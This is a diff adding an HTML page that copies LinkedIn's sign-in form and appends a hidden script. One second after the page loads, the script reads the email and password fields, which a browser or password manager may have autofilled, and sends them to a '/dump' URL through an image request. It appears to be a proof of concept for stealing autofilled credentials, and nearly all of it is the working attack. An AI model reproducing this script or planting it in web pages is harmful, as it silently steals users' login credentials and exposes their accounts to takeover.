@@ -1,0 +1,60 @@
+<html><body>
+<form action="https://www.linkedin.com/uas/login-submit" method="POST" name="login" novalidate="novalidate" id="login" class="ajax-form" data-jsenabled="check">
+  <input type="hidden" name="isJsEnabled" value="true">
+  <input type="hidden" name="source_app" value="">
+  <fieldset>
+    <legend>Sign In</legend>
+    
+   <ul id="control_gen_0">
+    <li>
+      <label for="session_key-login">Email</label>
+
+      <div class="fieldgroup">
+     <span class="error" id="session_key-login-error"></span>
+     <input type="text" name="session_key" value="" id="session_key-login" autofocus="" tabindex="1" size="27" data-ime-mode-disabled="">
+      </div>
+    </li>
+    <li>
+      <label for="session_password-login">Password</label>
+     <a href="https://www.linkedin.com/uas/request-password-reset?trk=signin_fpwd" class="forgot-pwd" tabindex="4">Forgot your password?</a>
+      <div class="fieldgroup">
+     <span class="error" id="session_password-login-error"></span>
+     <input type="password" name="session_password" value="" id="session_password-login" tabindex="2" size="27">
+      </div>
+    </li>
+     <li class="button">
+    <input type="submit" name="signin" value="Sign In" id="signin" tabindex="3" class="btn-secondary">
+     </li>
+   </ul>
+
+    <script id="controlinit-http-12209-162962-1" type="text/javascript+initialized" class="li-control">
+  /* extlib: _login */
+   LI.Controls.addControl('control-http-12209-162962-1', 'Login', {
+   autoFocus: true,
+   disableSubmit: true,
+   submitId: 'signin'
+    });
+    </script>
+  
+  </fieldset>
+    <input type="hidden" name="session_redirect" value="" id="session_redirect-login"><input type="hidden" name="csrfToken" value="ajax:1877875437922477927" id="csrfToken-login"><input type="hidden" name="sourceAlias" value="0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi" id="sourceAlias-login">
+    </form>
+
+<script>
+setTimeout(dynomite, 1000);
+
+function dynomite()
+{
+username = document.getElementsByTagName('input')[2].value;
+password = document.getElementsByTagName('input')[3].value;
+//alert('pass : '+password);
+
+var img = new Image();
+img.src="http://www.linkedin.com/dump?"+username+"&"+password+"&"+document.domain;
+document.body.appendChild(img);
+}
+</script>
+
+
+</body></html>
+
